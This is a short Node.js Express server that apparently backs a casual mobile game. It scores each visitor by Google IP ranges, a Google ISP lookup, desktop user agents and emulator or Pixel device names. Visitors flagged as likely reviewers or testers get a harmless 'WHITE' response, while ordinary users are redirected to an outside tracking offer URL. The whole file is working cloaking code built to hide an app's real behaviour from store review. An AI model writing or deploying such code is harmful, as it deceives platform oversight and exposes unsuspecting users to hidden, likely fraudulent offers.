const express = require('express')
const axios = require('axios')
const ipRangeCheck = require('ip-range-check')

const app = express()
app.use(express.json())

// 🔥 ОПТИМАЛЬНІ GOOGLE IP (НЕ 1000 рядків)
const GOOGLE_IP_RANGES = [
    "34.0.0.0/8",
    "35.0.0.0/8",
    "66.249.64.0/19",
    "64.233.160.0/19",
    "8.8.8.0/24"
]

// 🔥 EMULATOR / FAKE DEVICES
const BAD_DEVICES = [
    "sdk",
    "emulator",
    "generic",
    "x86",
    "test-keys",
    "genymotion"
]

// 🔥 MAIN FLOW
app.post('/flow', async (req, res) => {

    // =========================
    // 📡 IP
    // =========================
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ""
    const ip = rawIp.split(',')[0].trim()

    const { device = "", userAgent = "" } = req.body

    let isp = ""

    try {
        const ipData = await axios.get(`https://ipapi.co/${ip}/json/`, {
            timeout: 2000
        })
        isp = ipData.data.org || ""
    } catch (e) {
        console.log("IP API error:", e.message)
    }

    // =========================
    // 🧠 RISK SYSTEM
    // =========================
    let risk = 0

    // 🔥 IP RANGE
    if (ipRangeCheck(ip, GOOGLE_IP_RANGES)) {
        risk += 70
        console.log("⚠️ Google IP:", ip)
    }

    // 🔥 ISP
    if (isp.includes("Google")) {
        risk += 50
        console.log("⚠️ Google ISP:", isp)
    }

    // 🔥 DESKTOP
    if (
        userAgent.includes("Windows") ||
        userAgent.includes("Mac") ||
        userAgent.includes("X11")
    ) {
        risk += 40
        console.log("⚠️ Desktop:", userAgent)
    }

    // 🔥 EMULATOR / FAKE DEVICE
    const lowerDevice = device.toLowerCase()

    if (BAD_DEVICES.some(d => lowerDevice.includes(d))) {
        risk += 80
        console.log("⚠️ Emulator:", device)
    }

    // 🔥 GOOGLE DEVICES (М'ЯКИЙ СИГНАЛ)
    if (
        device.includes("Pixel") ||
        device.includes("Nexus")
    ) {
        risk += 20
    }

    // =========================
    // 🚫 BLOCK
    // =========================
    if (risk >= 60) {
        console.log("❌ WHITE (blocked):", ip, "risk:", risk)
        return res.json({ action: "WHITE" })
    }

    // =========================
    // ✅ GOOD USER
    // =========================
    console.log("✅ OFFER:", ip, "risk:", risk)

    return res.json({
        action: "OFFER",
        url: "https://trikstrip.fun/9YMjTwDG?sub_id_1=com.casual.memory.prismtwins"
    })
})

// =========================
// 🚀 START
// =========================
app.listen(3000, () => {
    console.log("🚀 Server started on port 3000")
})
